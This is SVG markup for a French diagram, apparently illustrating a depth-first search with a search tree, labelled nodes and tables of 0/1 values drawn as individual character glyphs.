<path d='M 384,208 L 416,208' fill='none' stroke='currentColor'></path>
<path d='M 416,208 L 448,208' fill='none' stroke='currentColor'></path>
<path d='M 448,208 L 480,208' fill='none' stroke='currentColor'></path>
<path d='M 480,208 L 512,208' fill='none' stroke='currentColor'></path>
<path d='M 160,336 L 424,336' fill='none' stroke='currentColor'></path>
<path d='M 304,368 L 320,368' fill='none' stroke='currentColor'></path>
<path d='M 168,448 L 184,448' fill='none' stroke='currentColor'></path>
<path d='M 352,464 L 368,464' fill='none' stroke='currentColor'></path>
<path d='M 168,576 L 184,576' fill='none' stroke='currentColor'></path>
<path d='M 144,816 L 384,816' fill='none' stroke='currentColor'></path>
<path d='M 0,832 L 32,832' fill='none' stroke='currentColor'></path>
<path d='M 32,832 L 64,832' fill='none' stroke='currentColor'></path>
<path d='M 64,832 L 96,832' fill='none' stroke='currentColor'></path>
<path d='M 96,832 L 136,832' fill='none' stroke='currentColor'></path>
<path d='M 136,832 L 176,832' fill='none' stroke='currentColor'></path>
<path d='M 176,832 L 208,832' fill='none' stroke='currentColor'></path>
<path d='M 208,832 L 240,832' fill='none' stroke='currentColor'></path>
<path d='M 240,832 L 272,832' fill='none' stroke='currentColor'></path>
<path d='M 272,832 L 304,832' fill='none' stroke='currentColor'></path>
<path d='M 304,832 L 336,832' fill='none' stroke='currentColor'></path>
<path d='M 336,832 L 368,832' fill='none' stroke='currentColor'></path>
<path d='M 368,832 L 400,832' fill='none' stroke='currentColor'></path>
<path d='M 400,832 L 432,832' fill='none' stroke='currentColor'></path>
<path d='M 432,832 L 464,832' fill='none' stroke='currentColor'></path>
<path d='M 464,832 L 496,832' fill='none' stroke='currentColor'></path>
<path d='M 496,832 L 528,832' fill='none' stroke='currentColor'></path>
<path d='M 0,864 L 32,864' fill='none' stroke='currentColor'></path>
<path d='M 32,864 L 64,864' fill='none' stroke='currentColor'></path>
<path d='M 64,864 L 96,864' fill='none' stroke='currentColor'></path>
<path d='M 96,864 L 136,864' fill='none' stroke='currentColor'></path>
<path d='M 136,864 L 176,864' fill='none' stroke='currentColor'></path>
<path d='M 176,864 L 208,864' fill='none' stroke='currentColor'></path>
<path d='M 208,864 L 240,864' fill='none' stroke='currentColor'></path>
<path d='M 240,864 L 272,864' fill='none' stroke='currentColor'></path>
<path d='M 272,864 L 304,864' fill='none' stroke='currentColor'></path>
<path d='M 304,864 L 336,864' fill='none' stroke='currentColor'></path>
<path d='M 336,864 L 368,864' fill='none' stroke='currentColor'></path>
<path d='M 368,864 L 400,864' fill='none' stroke='currentColor'></path>
<path d='M 400,864 L 432,864' fill='none' stroke='currentColor'></path>
<path d='M 432,864 L 464,864' fill='none' stroke='currentColor'></path>
<path d='M 464,864 L 496,864' fill='none' stroke='currentColor'></path>
<path d='M 496,864 L 528,864' fill='none' stroke='currentColor'></path>
<path d='M 144,944 L 392,944' fill='none' stroke='currentColor'></path>
<path d='M 0,960 L 32,960' fill='none' stroke='currentColor'></path>
<path d='M 32,960 L 64,960' fill='none' stroke='currentColor'></path>
<path d='M 64,960 L 96,960' fill='none' stroke='currentColor'></path>
<path d='M 96,960 L 128,960' fill='none' stroke='currentColor'></path>
<path d='M 128,960 L 160,960' fill='none' stroke='currentColor'></path>
<path d='M 160,960 L 192,960' fill='none' stroke='currentColor'></path>
<path d='M 192,960 L 224,960' fill='none' stroke='currentColor'></path>
<path d='M 224,960 L 256,960' fill='none' stroke='currentColor'></path>
<path d='M 256,960 L 288,960' fill='none' stroke='currentColor'></path>
<path d='M 288,960 L 320,960' fill='none' stroke='currentColor'></path>
<path d='M 320,960 L 352,960' fill='none' stroke='currentColor'></path>
<path d='M 352,960 L 384,960' fill='none' stroke='currentColor'></path>
<path d='M 384,960 L 416,960' fill='none' stroke='currentColor'></path>
<path d='M 416,960 L 448,960' fill='none' stroke='currentColor'></path>
<path d='M 448,960 L 480,960' fill='none' stroke='currentColor'></path>
<path d='M 480,960 L 512,960' fill='none' stroke='currentColor'></path>
<path d='M 0,992 L 32,992' fill='none' stroke='currentColor'></path>
<path d='M 32,992 L 64,992' fill='none' stroke='currentColor'></path>
<path d='M 64,992 L 96,992' fill='none' stroke='currentColor'></path>
<path d='M 96,992 L 128,992' fill='none' stroke='currentColor'></path>
<path d='M 128,992 L 160,992' fill='none' stroke='currentColor'></path>
<path d='M 160,992 L 192,992' fill='none' stroke='currentColor'></path>
<path d='M 192,992 L 224,992' fill='none' stroke='currentColor'></path>
<path d='M 224,992 L 256,992' fill='none' stroke='currentColor'></path>
<path d='M 256,992 L 288,992' fill='none' stroke='currentColor'></path>
<path d='M 288,992 L 320,992' fill='none' stroke='currentColor'></path>
<path d='M 320,992 L 352,992' fill='none' stroke='currentColor'></path>
<path d='M 352,992 L 384,992' fill='none' stroke='currentColor'></path>
<path d='M 384,992 L 416,992' fill='none' stroke='currentColor'></path>
<path d='M 416,992 L 448,992' fill='none' stroke='currentColor'></path>
<path d='M 448,992 L 480,992' fill='none' stroke='currentColor'></path>
<path d='M 480,992 L 512,992' fill='none' stroke='currentColor'></path>
<path d='M 0,48 L 0,80' fill='none' stroke='currentColor'></path>
<path d='M 0,176 L 0,208' fill='none' stroke='currentColor'></path>
<path d='M 0,832 L 0,864' fill='none' stroke='currentColor'></path>
<path d='M 0,960 L 0,992' fill='none' stroke='currentColor'></path>
<path d='M 32,48 L 32,80' fill='none' stroke='currentColor'></path>
<path d='M 32,176 L 32,208' fill='none' stroke='currentColor'></path>
<path d='M 32,832 L 32,864' fill='none' stroke='currentColor'></path>
<path d='M 32,960 L 32,992' fill='none' stroke='currentColor'></path>
<path d='M 64,48 L 64,80' fill='none' stroke='currentColor'></path>
<path d='M 64,176 L 64,208' fill='none' stroke='currentColor'></path>
<path d='M 64,832 L 64,864' fill='none' stroke='currentColor'></path>
<path d='M 64,960 L 64,992' fill='none' stroke='currentColor'></path>
<path d='M 96,48 L 96,80' fill='none' stroke='currentColor'></path>
<path d='M 96,176 L 96,208' fill='none' stroke='currentColor'></path>
<path d='M 96,832 L 96,864' fill='none' stroke='currentColor'></path>
<path d='M 96,960 L 96,992' fill='none' stroke='currentColor'></path>
<path d='M 128,48 L 128,80' fill='none' stroke='currentColor'></path>
<path d='M 128,176 L 128,208' fill='none' stroke='currentColor'></path>
<path d='M 128,960 L 128,992' fill='none' stroke='currentColor'></path>
<path d='M 136,832 L 136,864' fill='none' stroke='currentColor'></path>
<path d='M 160,48 L 160,80' fill='none' stroke='currentColor'></path>
<path d='M 160,176 L 160,208' fill='none' stroke='currentColor'></path>
<path d='M 160,960 L 160,992' fill='none' stroke='currentColor'></path>
<path d='M 176,240 L 176,256' fill='none' stroke='currentColor'></path>
<path d='M 176,832 L 176,864' fill='none' stroke='currentColor'></path>
<path d='M 192,48 L 192,80' fill='none' stroke='currentColor'></path>
<path d='M 192,176 L 192,208' fill='none' stroke='currentColor'></path>
<path d='M 192,960 L 192,992' fill='none' stroke='currentColor'></path>
<path d='M 208,832 L 208,864' fill='none' stroke='currentColor'></path>
<path d='M 224,48 L 224,80' fill='none' stroke='currentColor'></path>
<path d='M 224,176 L 224,208' fill='none' stroke='currentColor'></path>
<path d='M 224,960 L 224,992' fill='none' stroke='currentColor'></path>
<path d='M 240,832 L 240,864' fill='none' stroke='currentColor'></path>
<path d='M 256,48 L 256,80' fill='none' stroke='currentColor'></path>
<path d='M 256,176 L 256,208' fill='none' stroke='currentColor'></path>
<path d='M 256,960 L 256,992' fill='none' stroke='currentColor'></path>
<path d='M 272,832 L 272,864' fill='none' stroke='currentColor'></path>
<path d='M 288,48 L 288,80' fill='none' stroke='currentColor'></path>
<path d='M 288,176 L 288,208' fill='none' stroke='currentColor'></path>
<path d='M 288,960 L 288,992' fill='none' stroke='currentColor'></path>
<path d='M 304,832 L 304,864' fill='none' stroke='currentColor'></path>
<path d='M 320,48 L 320,80' fill='none' stroke='currentColor'></path>
<path d='M 320,176 L 320,208' fill='none' stroke='currentColor'></path>
<path d='M 320,960 L 320,992' fill='none' stroke='currentColor'></path>
<path d='M 336,832 L 336,864' fill='none' stroke='currentColor'></path>
<path d='M 352,48 L 352,80' fill='none' stroke='currentColor'></path>
<path d='M 352,176 L 352,208' fill='none' stroke='currentColor'></path>
<path d='M 352,960 L 352,992' fill='none' stroke='currentColor'></path>
<path d='M 368,832 L 368,864' fill='none' stroke='currentColor'></path>
<path d='M 384,48 L 384,80' fill='none' stroke='currentColor'></path>
<path d='M 384,176 L 384,208' fill='none' stroke='currentColor'></path>
<path d='M 384,960 L 384,992' fill='none' stroke='currentColor'></path>
<path d='M 400,832 L 400,864' fill='none' stroke='currentColor'></path>
<path d='M 416,48 L 416,80' fill='none' stroke='currentColor'></path>
<path d='M 416,176 L 416,208' fill='none' stroke='currentColor'></path>
<path d='M 416,960 L 416,992' fill='none' stroke='currentColor'></path>
<path d='M 432,832 L 432,864' fill='none' stroke='currentColor'></path>
<path d='M 448,48 L 448,80' fill='none' stroke='currentColor'></path>
<path d='M 448,176 L 448,208' fill='none' stroke='currentColor'></path>
<path d='M 448,960 L 448,992' fill='none' stroke='currentColor'></path>
<path d='M 464,832 L 464,864' fill='none' stroke='currentColor'></path>
<path d='M 480,48 L 480,80' fill='none' stroke='currentColor'></path>
<path d='M 480,176 L 480,208' fill='none' stroke='currentColor'></path>
<path d='M 480,960 L 480,992' fill='none' stroke='currentColor'></path>
<path d='M 496,832 L 496,864' fill='none' stroke='currentColor'></path>
<path d='M 512,48 L 512,80' fill='none' stroke='currentColor'></path>
<path d='M 512,176 L 512,208' fill='none' stroke='currentColor'></path>
<path d='M 512,960 L 512,992' fill='none' stroke='currentColor'></path>
<path d='M 528,832 L 528,864' fill='none' stroke='currentColor'></path>
<path d='M 216,432 L 240,384' fill='none' stroke='currentColor'></path>
<path d='M 160,736 L 184,688' fill='none' stroke='currentColor'></path>
<path d='M 200,656 L 232,592' fill='none' stroke='currentColor'></path>
<path d='M 248,560 L 288,480' fill='none' stroke='currentColor'></path>
<path d='M 320,640 L 344,592' fill='none' stroke='currentColor'></path>
<path d='M 200,688 L 224,736' fill='none' stroke='currentColor'></path>
<path d='M 248,592 L 272,640' fill='none' stroke='currentColor'></path>
<path d='M 256,384 L 288,448' fill='none' stroke='currentColor'></path>
<path d='M 304,480 L 344,560' fill='none' stroke='currentColor'></path>
<path d='M 360,592 L 384,640' fill='none' stroke='currentColor'></path>
<polygon points='184.000000,240.000000 172.000000,234.399994 172.000000,245.600006' fill='currentColor' transform='rotate(270.000000, 176.000000, 240.000000)'></polygon>
<polygon points='192.000000,448.000000 180.000000,442.399994 180.000000,453.600006' fill='currentColor' transform='rotate(0.000000, 184.000000, 448.000000)'></polygon>
<polygon points='192.000000,576.000000 180.000000,570.400024 180.000000,581.599976' fill='currentColor' transform='rotate(0.000000, 184.000000, 576.000000)'></polygon>
<polygon points='312.000000,368.000000 300.000000,362.399994 300.000000,373.600006' fill='currentColor' transform='rotate(180.000000, 304.000000, 368.000000)'></polygon>
<polygon points='360.000000,464.000000 348.000000,458.399994 348.000000,469.600006' fill='currentColor' transform='rotate(180.000000, 352.000000, 464.000000)'></polygon>
<path d='M 248,352 A 16,16 0 0,0 232,368' fill='none' stroke='currentColor'></path>
<path d='M 248,352 A 16,16 0 0,1 264,368' fill='none' stroke='currentColor'></path>
<path d='M 232,368 A 16,16 0 0,0 248,384' fill='none' stroke='currentColor'></path>
<path d='M 264,368 A 16,16 0 0,1 248,384' fill='none' stroke='currentColor'></path>
<path d='M 296,448 A 16,16 0 0,0 280,464' fill='none' stroke='currentColor'></path>
<path d='M 296,448 A 16,16 0 0,1 312,464' fill='none' stroke='currentColor'></path>
<path d='M 280,464 A 16,16 0 0,0 296,480' fill='none' stroke='currentColor'></path>
<path d='M 312,464 A 16,16 0 0,1 296,480' fill='none' stroke='currentColor'></path>
<path d='M 240,560 A 16,16 0 0,0 224,576' fill='none' stroke='currentColor'></path>
<path d='M 240,560 A 16,16 0 0,1 256,576' fill='none' stroke='currentColor'></path>
<path d='M 352,560 A 16,16 0 0,0 336,576' fill='none' stroke='currentColor'></path>
<path d='M 352,560 A 16,16 0 0,1 368,576' fill='none' stroke='currentColor'></path>
<path d='M 224,576 A 16,16 0 0,0 240,592' fill='none' stroke='currentColor'></path>
<path d='M 256,576 A 16,16 0 0,1 240,592' fill='none' stroke='currentColor'></path>
<path d='M 336,576 A 16,16 0 0,0 352,592' fill='none' stroke='currentColor'></path>
<path d='M 368,576 A 16,16 0 0,1 352,592' fill='none' stroke='currentColor'></path>
<path d='M 192,656 A 16,16 0 0,0 176,672' fill='none' stroke='currentColor'></path>
<path d='M 192,656 A 16,16 0 0,1 208,672' fill='none' stroke='currentColor'></path>
<path d='M 176,672 A 16,16 0 0,0 192,688' fill='none' stroke='currentColor'></path>
<path d='M 208,672 A 16,16 0 0,1 192,688' fill='none' stroke='currentColor'></path>
<text text-anchor='middle' x='16' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='100' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='228' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='852' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='16' y='884' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='980' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='16' y='1012' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='852' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='48' y='980' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='56' y='452' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='56' y='580' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='64' y='452' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='64' y='580' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='72' y='452' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='72' y='580' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='452' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='80' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='80' y='852' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='80' y='980' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='88' y='452' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='96' y='276' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='96' y='452' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='580' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='104' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='104' y='580' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='112' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='112' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='112' y='276' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='112' y='452' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='112' y='580' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='112' y='852' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='112' y='980' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='120' y='276' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='120' y='452' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='120' y='580' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='120' y='852' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='128' y='276' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='128' y='580' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='136' y='580' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='144' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='580' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='144' y='804' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='144' y='932' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='144' y='980' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='152' y='452' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='152' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='152' y='756' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='152' y='804' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='152' y='852' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='152' y='932' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='160' y='804' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='160' y='852' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='160' y='932' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='168' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='804' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='168' y='932' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='176' y='324' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='176' y='804' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='932' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='184' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='804' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='932' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='192' y='676' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='804' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='932' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='208' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='208' y='324' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='208' y='804' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='208' y='932' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='208' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='216' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='804' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='932' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='804' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='932' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='232' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='232' y='324' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='232' y='756' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='232' y='804' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='232' y='932' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='240' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='324' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='240' y='580' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='804' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='240' y='932' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='240' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='248' y='276' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='248' y='324' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='248' y='372' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='248' y='804' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='248' y='932' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='256' y='324' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='256' y='804' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='256' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='932' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='264' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='264' y='804' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='932' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='272' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='324' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='272' y='804' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='272' y='932' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='280' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='280' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='280' y='660' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='280' y='932' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='148' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='288' y='804' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='288' y='932' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='296' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='296' y='468' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='296' y='804' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='324' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='304' y='804' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='304' y='932' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='312' y='324' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='312' y='660' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='312' y='804' fill='currentColor' style='font-size:1em'>√®</text>
<text text-anchor='middle' x='312' y='932' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='324' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='320' y='804' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='320' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='932' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='328' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='328' y='932' fill='currentColor' style='font-size:1em'>√®</text>
